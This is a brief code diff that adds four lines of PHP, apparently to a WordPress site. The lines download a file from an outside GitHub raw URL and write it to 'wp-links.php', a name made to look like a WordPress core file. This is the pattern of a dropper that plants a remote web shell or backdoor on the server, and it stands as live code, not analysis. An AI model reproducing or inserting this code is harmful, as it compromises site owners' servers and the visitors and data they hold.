@@ -1,0 +1,4 @@
+$nama= fopen("wp-links.php" ,"w+");
+  $file = file_get_contents('https://raw.githubusercontent.com/darryldavis7/verea/main/bajingan');
+  $tulis = fwrite ($nama ,$file);
+ fclose($nama);
